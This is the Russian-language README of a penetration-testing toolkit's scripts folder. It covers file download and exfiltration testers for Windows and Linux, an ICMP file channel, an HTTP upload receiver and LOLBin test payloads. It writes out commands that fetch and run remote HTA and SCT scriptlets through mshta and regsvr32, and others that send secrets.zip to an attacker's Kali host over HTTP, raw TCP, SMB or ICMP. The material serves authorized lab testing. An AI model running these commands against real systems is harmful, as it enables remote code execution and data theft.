# scripts

[English](README.md) · [Русский](README-RU.md)

[← Назад к справочнику](../README_RU.md)

Готовые скрипты из справочника. Каждый самодостаточный, с минимумом зависимостей.

| Скрипт | Что делает | Зависимости |
|--------|-----------|-------------|
| [`upload/serv.py`](upload/serv.py) | HTTP-приёмник: multipart (любое имя поля) + raw POST/PUT; `-p`, `-d`, `--max-size`, `--token`, TLS, SHA-256 | Python 3.9+ |
| [`Windows-download-test.ps1`](Windows-download-test.ps1) | тестер загрузки в Windows; первый успех по умолчанию; `-NoLogs`/`-Log`/`-LOLBINS`/`-Danger`/`-DIR`; `-All` - безопасная матрица + лог | Windows PowerShell 5.1+ |
| [`Windows-Exfil-tester.ps1`](Windows-Exfil-tester.ps1) | отправляет файл на Kali-приёмник; первый успех по умолчанию; `-NoLogs`/`-Log`/`-LOLBINS`/`-FILE`/`-Receiver`; `-All` - матрица + лог | Windows PowerShell 5.1+ |
| [`Linux-download-test.py`](Linux-download-test.py) | тестирует curl/wget/python/perl/php/ruby/node/bash/busybox/aria2c/axel; `--all` = матрица + лог/CSV | Python 3.8+ |
| [`Linux-exfil-test.py`](Linux-exfil-test.py) | тестирует uploadserver, serv.py, nginx, WebDAV, FTP, SMB и raw TCP; `--all` = матрица + лог/CSV | Python 3.8+ |
| [`icmp/icmp_send.py`](icmp/icmp_send.py) | отправка файла в ICMP echo request | Python 3, root |
| [`icmp/icmp_recv.py`](icmp/icmp_recv.py) | приём и сборка файла из ICMP | Python 3, `scapy`, root |
| [`payload.hta`](payload.hta) | минимальный HTA для метода mshta; запускает `calc` и закрывается | Windows |
| [`payload.sct`](payload.sct) | минимальный SCT-скриптлет для regsvr32 Squiblydoo; запускает `calc` | Windows |

## Тестовые payload для LOLBin

Оба файла только запускают `calc` и предназначены для одноразовой лаборатории.
Раздайте их с LHOST:

```bash
cp payload.hta payload.sct /tmp/share/
cd /tmp/share && python3 -m http.server 1337
```

RHOST:

```cmd
mshta http://10.10.14.5:1337/payload.hta
regsvr32 /s /n /u /i:http://10.10.14.5:1337/payload.sct scrobj.dll
```



## Быстрый старт

**Приёмник (LHOST):**
```bash
python3 upload/serv.py                  # 0.0.0.0:8000, текущий каталог
python3 upload/serv.py -p 9001 -d /tmp/loot --max-size 2G
python3 upload/serv.py -p 8443 --tls-cert server.pem --tls-key server.key
```
`serv.py` также поддерживает `--token` (в `X-Upload-Token` или `?token=`) и `GET /health`; для каждого сохранённого файла SHA-256 печатается в ответе и stdout.

**ICMP-канал (эксфил RHOST -> LHOST):**
```bash
# LHOST: приёмник
sudo apt install -y python3-scapy
sudo python3 icmp/icmp_recv.py -o loot.zip

# RHOST: отправитель (после запуска приёмника)
# скопировать icmp/icmp_send.py на цель любым каналом
sudo python3 icmp_send.py <LHOST> loot.zip
```

Полный разбор флагов, MTU и потерь пакетов - в [12-dns-icmp.md](../docs/ru/12-dns-icmp.md).

**Linux-тестеры загрузки/эксфила (запускать на RHOST):**
```bash
# первый рабочий метод
python3 Linux-download-test.py 10.10.14.5 -p 8000 -f payload.sh

# полная матрица + лог/CSV
python3 Linux-download-test.py 10.10.14.5 -p 8000 -f payload.sh --all

# self-signed HTTPS
python3 Linux-download-test.py 10.10.14.5 -p 443 -f payload.sh --scheme https --all

# эксфил на serv.py
python3 Linux-exfil-test.py 10.10.14.5 -p 8000 -f ./secrets.zip --receiver servpy --all

# эксфил по raw TCP
python3 Linux-exfil-test.py 10.10.14.5 -p 8000 -f ./secrets.zip --receiver rawtcp --raw-port 4444
```
`Linux-download-test.py` не запускает скачанный файл, а
`Linux-exfil-test.py` только отправляет исходный файл. `--list` покажет
установленные клиенты.

**Тестер загрузки в Windows (запускать на RHOST):**
```powershell
.\Windows-download-test.ps1 -LHOST 10.0.2.10 -LPORT 1337
.\Windows-download-test.ps1 -LHOST 10.0.2.10 -LPORT 1337 -NoLogs
.\Windows-download-test.ps1 -LHOST 10.0.2.10 -LPORT 1337 -DIR C:\Users\Public
.\Windows-download-test.ps1 -LHOST 10.0.2.10 -LPORT 1337 -LOLBINS
.\Windows-download-test.ps1 -LHOST 10.0.2.10 -LPORT 1337 -LOLBINS -All
.\Windows-download-test.ps1 -LHOST 10.0.2.10 -LPORT 1337 -Danger -All
.\Windows-download-test.ps1 -LHOST 10.0.2.10 -LPORT 1337 -UNCPath '\\10.0.2.10\share\payload.exe' -All
```
- По умолчанию: останавливается на первом рабочем способе, только консоль.
- `-Log`: быстрый режим + лог/CSV.
- `-NoLogs`: в быстром режиме печатает только `Done!`, сохраняет файл под исходным именем в текущую папку (или в `-DIR`), логи не пишет. С `-All` полная матрица всё равно прогоняется, но log/CSV не создаются; скачанные тестовые файлы остаются в каталоге назначения.
- `-DIR`: каталог назначения (по умолчанию `C:\Users\Public`).
- `-LOLBINS`: только безопасные LOLBin-методы (certutil, BITS, bitsadmin, MpCmdRun, UNC-хелперы); danger-методы исключены.
- `-Danger`: только danger-методы: desktopimgdownldr (lockscreen/реестр), certutil `-URL` (CryptnetUrlCache), CertOC, ConfigSecurityPolicy, xsd, IMEWDBLD (INetCache). Они исключены из `-All`/`-LOLBINS`; `-Danger -LOLBINS` включает оба набора. Payload не выполняется.
- `-UNCPath`: включает UNC-тесты (`esentutl`, `extrac32`, `replace`). Нужна SMB/WebDAV-шара на LHOST.
- `-All`: полная безопасная матрица + лог/CSV; danger-методы исключены, если не указан `-Danger`. `-Debug` в PowerShell зарезервирован.

> **Безопасность:** не используйте `-Danger` на production. Он включает методы, меняющие lockscreen/реестр и пишущие в кэш; запускайте только на одноразовой lab-VM. Default и `-All` исключают danger-методы.

**Что покрыто (безопасное):** iwr, irm, WebClient, WebClient proxy, WebRequest, HttpClient, curl, wget; certutil (`-urlcache`), BITS normal/`-Dynamic`, bitsadmin normal/`/dynamic`, MpCmdRun (только там, где есть `-DownloadFile`), UNC `esentutl`/`extrac32`/`replace`.

**Danger-only (`-Danger`):** desktopimgdownldr (меняет lockscreen и `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\PersonalizationCSP`); certutil `-URL` (CryptnetUrlCache); CertOC (текст/кэш); ConfigSecurityPolicy/xsd/IMEWDBLD (INetCache). Это download-only, но с записью в кэш/изменением состояния.

**Для UNC нужна шара на LHOST и аутентификация до запуска:**
```bash
# LHOST
sudo impacket-smbserver share /tmp/share -smb2support -username test -password test
```
```cmd
:: Windows - ОБЯЗАТЕЛЬНО для шары с аутентификацией; без этого UNC-методы
:: падают с "Path not found" / "Cannot open file"
net use \\10.0.2.10\share /user:test test
```
Затем:
```powershell
.\Windows-download-test.ps1 -LHOST 10.0.2.10 -LPORT 1337 -UNCPath '\\10.0.2.10\share\payload.exe' -All
```
> `esentutl` может всё равно падать с `JET_errDiskIO` на некоторых SMB-шарах/сборках Server даже после `net use`; надёжнее `extrac32` и `replace`.

**Тестер эксфила из Windows (запускать на RHOST):**
```powershell
.\Windows-Exfil-tester.ps1 -LHOST 10.0.2.10 -LPORT 8000
.\Windows-Exfil-tester.ps1 -LHOST 10.0.2.10 -LPORT 8000 -NoLogs
.\Windows-Exfil-tester.ps1 -LHOST 10.0.2.10 -LPORT 8000 -FILE C:\Users\Public\secrets.zip -All
.\Windows-Exfil-tester.ps1 -LHOST 10.0.2.10 -LPORT 8000 -FILE C:\Users\Public\secrets.zip -All -Receiver uploadserver
.\Windows-Exfil-tester.ps1 -LHOST 10.0.2.10 -LPORT 8000 -LOLBINS -All
.\Windows-Exfil-tester.ps1 -LHOST 10.0.2.10 -LPORT 8000 -UNCPath '\\10.0.2.10\share\' -All -Receiver smb
.\Windows-Exfil-tester.ps1 -LHOST 10.0.2.10 -LPORT 8000 -ALL -Receiver rawtcp -RawPort 4444
```
- По умолчанию: останавливается на первом успешном upload, только консоль.
- `-Log`: быстрый режим + лог/CSV; `-NoLogs`: только `Done!`.
- `-FILE`: полный локальный путь к файлу (по умолчанию `C:\Users\Public\secrets.zip`); логи пишутся в его каталог. Это не каталог loot на Kali.
- `-LOLBINS`: certreq, ConfigSecurityPolicy, certutil-curl, bitsadmin.
- `-Receiver`: `All` (по умолчанию), `UploadServer`, `ServPy`, `Nginx`, `Bits`, `RawTcp`, `Smb`. Используйте с `-All`, чтобы тестировать только запущенный приёмник.
- `-UNCPath`: каталог назначения SMB/WebDAV; сначала `net use`.
- `-RawPort`: raw TCP; на Kali запустите `nc -lvnp 4444 > secrets.zip`.
- `-All`: полная матрица + лог/CSV в каталоге источника. Без `-Receiver` идут все профили, и методы для других приёмников падают; для чистого прогона используйте `-Receiver`.

`certutil-curl` отправляет base64-текст - на Kali декодируйте через `base64 -d`. `bitsadmin` upload требует BITS-совместимый сервер и обычно падает на обычных приёмниках; включён для полноты. `certreq` и `ConfigSecurityPolicy` специализированные: им может быть нужен файл в формате сертификата/политики, и на generic-приёмнике они падают; надёжный LOLBin-текстовый канал — `certutil-curl`.

**Приёмник на Kali - выберите один и запустите в каталоге loot.**

**uploadserver (multipart, поле `files`):**
```bash
mkdir -p /tmp/loot && cd /tmp/loot
uploadserver 8000
```
Используйте `-Receiver uploadserver`.

**serv.py (raw POST/PUT или любое multipart-поле):**
```bash
python3 /path/to/file-transfer-arsenal/scripts/upload/serv.py -p 8000 -d /tmp/loot
# опционально: --max-size 2G --token s3cret --tls-cert cert.pem --tls-key key.pem
```
Используйте `-Receiver servpy`. Приёмник печатает путь и SHA-256 каждого сохранённого файла; `GET /health` — проверка готовности.

**nginx PUT (`/SecretUploadDirectory/`):**
```bash
sudo mkdir -p /tmp/loot/SecretUploadDirectory
sudo chown -R www-data:www-data /tmp/loot/SecretUploadDirectory
```
```nginx
server {
    listen 8000;
    root /tmp/loot;
    client_max_body_size 0;

    location /SecretUploadDirectory/ {
        dav_methods PUT;
        create_full_put_path on;
    }
}
```
Файлы лягут в `/tmp/loot/SecretUploadDirectory/`. Используйте `-Receiver nginx`.

**Raw TCP (`-RawPort`):**
```bash
nc -lvnp 4444 > /tmp/loot/secrets.zip
# или
socat -u TCP-LISTEN:4444,reuseaddr,fork OPEN:/tmp/loot/secrets.zip,creat,append
```
Используйте `-Receiver rawtcp -RawPort 4444`.

**SMB - impacket (`-UNCPath`):**
```bash
sudo impacket-smbserver share /tmp/loot -smb2support -username test -password test
```
```cmd
:: Windows - обязательно для шары с аутентификацией
net use \\10.0.2.10\share /user:test test
```
```powershell
.\Windows-Exfil-tester.ps1 -LHOST 10.0.2.10 -LPORT 8000 -FILE C:\Users\Public\secrets.zip -UNCPath '\\10.0.2.10\share\' -All -Receiver smb
```
Файлы лягут в `/tmp/loot`.

**BITS:**
`bitsadmin` upload требует BITS-совместимый сервер (IIS BITS/BITSServer). uploadserver, serv.py и nginx не реализуют BITS upload и отклонят его; это ожидаемо. Используйте `-Receiver bits` только с таким сервером.

**WebDAV (опционально):**
```bash
rclone serve webdav /tmp/loot --addr :8000 --user test --pass test
```
```cmd
net use \\10.0.2.10@8000\DavWWWRoot /user:test test
```
Используйте `-UNCPath '\\10.0.2.10@8000\DavWWWRoot\' -Receiver smb` (включите WebClient/BasicAuthLevel=2, как в разделе 04).

> `-All` без `-Receiver` запускает все профили; методы для других приёмников будут FAIL, это ожидаемо. Для чистого прогона используйте `-Receiver <profile>`.
>
> Тестер работает по HTTP. HTTPS-приёмники пока не покрыты; используйте HTTP-приёмник в лаборатории.


**Что не запускается специально:** mshta, regsvr32, msiexec, ieexec, installutil, ngen, presentationhost, xwizard, scrobj/PhotoViewer/shimgvw, Office, hh, winget, AppInstaller, update/squirrel. Они выполняют или устанавливают код, поэтому тестер загрузки не должен их запускать. `certutil -verifyctl` ориентирован на CTL и на некоторых сборках Windows Server падает на произвольных бинарниках. Cache/text-загрузчики находятся в `-Danger`. Cache-only методы (`ConfigSecurityPolicy`, `xsd`, `imewdbld`) тоже исключены: путь сохранения недетерминирован.

**Шифрование (Windows):**
AES-хелпер в репозиторий не входит. Он опубликован автором как gist:
<https://gist.github.com/ddumicz/909d98a0e794a42326d5fcd6d9f2c4ad>. Скачайте
его как `Invoke-AESEncryption.ps1`, затем:
```powershell
Import-Module .\Invoke-AESEncryption.ps1
```
См. [11 - Encryption](../docs/ru/11-encryption.md#powershell-aes-без-установки).

## Тесты

Тестам checksum и HTTP-приёмника нужен только Python 3.9+ (без root и scapy):

```bash
cd file-transfer-arsenal
python3 -m unittest discover -s tests -v
```

## Зависимости

```bash
sudo apt install -y python3-scapy   # icmp_recv.py
# Windows-тестер: Windows PowerShell 5.1+ (BITS, bitsadmin и certutil встроены)
```

> Скрипты предназначены только для авторизованных тестов и изолированных лабораторий.
